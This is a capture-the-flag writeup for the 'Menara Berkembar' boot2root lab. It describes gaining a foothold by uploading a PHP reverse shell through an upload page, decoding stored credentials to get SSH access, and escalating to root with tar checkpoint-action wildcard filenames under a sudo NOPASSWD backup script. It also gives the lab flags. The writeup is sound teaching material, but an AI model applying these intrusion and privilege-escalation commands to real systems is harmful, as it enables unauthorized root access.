---
slug: "local-ctf/bahtera-3108-2025/menara-berkembar"
event: "bahtera-3108-2025"
title: "Menara Berkembar"
summary: "Bahtera 3108 2025 Boot2Root writeup covering an upload-based foothold, credential discovery, SSH access, and sudo tar wildcard privilege escalation."
date: 2025-08-30
tags:
  - ctf
  - bahtera-3108
  - boot2root
  - linux
  - privilege-escalation
  - tar
category: "local-ctf"
difficulty: "medium"
platform: "ctf"
draft: false
---

# Menara Berkembar CTF — Privilege Escalation Writeup

- **Points:** 800
- **Credit:** MdHaniff

## 1. Initial Reconnaissance and Enumeration

The private lab target has been normalized to `[REDACTED_TARGET_IP]` for publication.

An Nmap scan revealed the following open services:

```text
21/tcp  ftp     vsftpd 3.0.5
22/tcp  ssh     OpenSSH 9.6p1 Ubuntu
80/tcp  http    Apache httpd 2.4.58
```

The HTTP service hosted an upload page at `/klcc_uploader.php`, while the FTP server hosted files under `/home/ftp/pub`.

## 2. Initial Foothold

A PHP reverse shell was uploaded through `/klcc_uploader.php`. A listener received the connection:

```bash
nc -lvnp 4444
```

The shell was upgraded to a better TTY with Python:

```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
export TERM=xterm
```

The active user and system were verified:

```bash
whoami
# www-data

uname -a
# Linux klcctower 6.8.0-64-generic x86_64
```

## 3. Credential Discovery

A file containing Base64-encoded credentials was discovered:

```bash
cat /var/www/html/apache2/mysql/secret
# W2RiXVxudXNlciA9IGpvaG5cbnBhc3N3b3JkID0ga2xjY1Bvd2VyMjAyNCE=
```

Decoding it produced:

```text
[db]\nuser = john\npassword = klccPower2024!
```

The credentials allowed SSH access as `john`:

```bash
ssh john@[REDACTED_TARGET_IP]
```

## 4. User Enumeration

The user flag was stored in John's home directory:

```bash
cat /home/john/user.txt
# 3108{welcome_to_the_upper_deck}
```

Checking sudo permissions exposed the privilege-escalation path:

```bash
sudo -l
# john may run NOPASSWD: /usr/local/bin/backup.sh
```

The permitted script changed into `/opt/important` and archived every filename using a wildcard:

```bash
cat /usr/local/bin/backup.sh
```

```bash
#!/bin/bash
cd /opt/important
tar czf /tmp/backup.tar.gz *
```

The archive directory was writable by `john`:

```bash
ls -ld /opt/important
# drwxrwxr-x 2 root john
```

## 5. Privilege Escalation Through `tar`

The combination of a writable working directory, a wildcard passed to `tar`, and a sudo `NOPASSWD` rule for the backup script allowed arbitrary commands to execute as root. This is a sudo misconfiguration; the backup script itself was not SUID.

First, a shell script was created in the writable directory:

```bash
echo -e '#!/bin/bash\n/bin/bash -p' > /opt/important/shell.sh
chmod +x /opt/important/shell.sh
```

Next, filenames that `tar` interprets as command-line options were created in the same directory:

```bash
cd /opt/important
touch -- '--checkpoint=1'
touch -- '--checkpoint-action=exec=sh shell.sh'
```

When the permitted backup command expanded `*`, those filenames enabled `tar --checkpoint-action=exec` and ran the shell as root:

```bash
sudo /usr/local/bin/backup.sh
```

The resulting shell confirmed root access:

```console
bash-5.2# whoami
root
```

## 6. Root Flag

The root flag was then retrieved:

```bash
cd /root
cat root.txt
# 3108{you_conquered_the_towers}
```

## Flags

| Flag | Value |
| --- | --- |
| User | `3108{welcome_to_the_upper_deck}` |
| Root | `3108{you_conquered_the_towers}` |

## Lessons Learned

1. A writable directory combined with a privileged wildcard operation is high risk.
2. `tar --checkpoint-action` can become a privilege-escalation vector when attacker-controlled filenames are expanded by a command running as root.
3. Always inspect `sudo -l`, the exact permitted command, and every directory that command uses.
